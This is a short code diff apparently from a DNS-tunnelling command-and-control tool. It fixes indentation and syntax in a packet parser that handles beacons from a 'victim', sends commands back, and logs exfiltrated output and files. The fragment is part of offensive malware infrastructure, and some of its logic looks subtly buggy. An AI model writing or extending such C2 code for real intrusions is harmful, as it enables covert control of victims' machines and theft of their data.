@@ -55,14 +55,14 @@ def parse_packet(packet):
         get_qname = packet[DNS].qd.qname
         print("print qname:")
         print(get_qname)   # class bytes
-	if get_an.startswith(BEACON):
-	    data_recieved = get_qname[len(BEACON)]
-	    send_command(victim_ip,vic_sport,get_qname,packet)
-	
+        if get_an.startswith(BEACON):
+            data_recieved = get_qname[len(BEACON)]
+            send_command(victim_ip,vic_sport,get_qname,packet)
+         
         elif get_an.startswith(BEGIN_OUTPUT):
             data_recieved = get_qname[len(BEGIN_OUTPUT)]	 
             opened_fd = open_file(LOG_OUTPUT)
-            write_to_file(opened_fd,data_recieved))  
+            write_to_file(opened_fd,data_recieved)  
             
         elif get_an.startswith(BEGIN_FILE):
             data_recieved = get_qname[len(BEGIN_FILE)]            
